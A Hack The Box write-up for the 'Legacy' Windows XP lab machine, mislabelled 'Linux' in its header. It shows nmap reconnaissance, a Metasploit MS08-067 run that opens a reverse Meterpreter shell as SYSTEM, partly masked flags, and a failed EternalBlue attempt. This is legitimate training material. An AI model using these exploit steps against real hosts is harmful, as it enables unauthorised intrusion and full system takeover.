---
title: Legacy
date: 2025-12-9 18:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, legacy ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/60dc190c4c015cfe3a3aef9b5afca254.png
    alt: Hack The Box
---

> Legacy
Linux · Easy 

## Task 1

How many TCP ports are open on Legacy?

``` shell
┌──(pmartinezr㉿kali)-[~/htb/legacy]
└─$ nmap -p- -sCVS -T 5 --min-rate 500 10.129.9.159    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 18:39 CET
Warning: 10.129.9.159 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.9.159
Host is up (0.044s latency).
Not shown: 64435 closed tcp ports (reset), 1097 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:58:30 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2025-12-14T21:38:21+02:00
|_clock-skew: mean: 5d00h57m40s, deviation: 1h24m51s, median: 4d23h57m40s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.60 seconds
```

> 3

## Task 2

What is the 2008 CVE ID for a vulnerability in SMB that allows for remote code execution?


> CVE-2008-4250

## Task 3

What is the name of the Metasploit module that exploits CVE-2008-4250?

``` shell
msf exploit(windows/smb/ms08_067_netapi) > run
[*] Started reverse TCP handler on 10.10.15.224:4444 
[*] 10.129.9.159:445 - Automatically detecting the target...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.23/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.9.159:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.9.159:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.9.159:445 - Attempting to trigger the vulnerability...
[*] Sending stage (188998 bytes) to 10.129.9.159
[*] Meterpreter session 1 opened (10.10.15.224:4444 -> 10.129.9.159:1041) at 2025-12-09 18:51:15 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Este exploit es famoso por ser de los primeros ejemplos que se utilizan en el libro "Metasploit para pentesters" de Pablo González.

> ms08_067_netapi

## Task 4

When exploiting MS08-067, what user does execution run as? Include the information before and after the .

> NT AUTHORITY\SYSTEM

## Submit the flag located on the john user's desktop.

``` shell
C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e************
```

> e69af0e4f443de7e************

## Submit the flag located on the administrator's desktop.

``` shell
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec************
```
> 993442d258b0e0e************

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/2)

## Task 7

In addition to MS08-067, Legacy's SMB service is also vulnerable to another remote code execution vulnerability with a CVE ID from 2017. What is that ID?

``` shell
msf auxiliary(scanner/smb/smb_ms17_010) > run
[+] 10.129.9.159:445      - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
[*] 10.129.9.159:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.15.224:4441 
[*] 10.129.9.159:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.9.159:445      - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
[*] 10.129.9.159:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.9.159:445 - The target is vulnerable.
[-] 10.129.9.159:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
[*] Exploit completed, but no session was created.

```
La máquina parace vulnerable a este exploit pero realmente no funciona, igualmente contestamos a la pregunta extra.

> CVE-2017-0143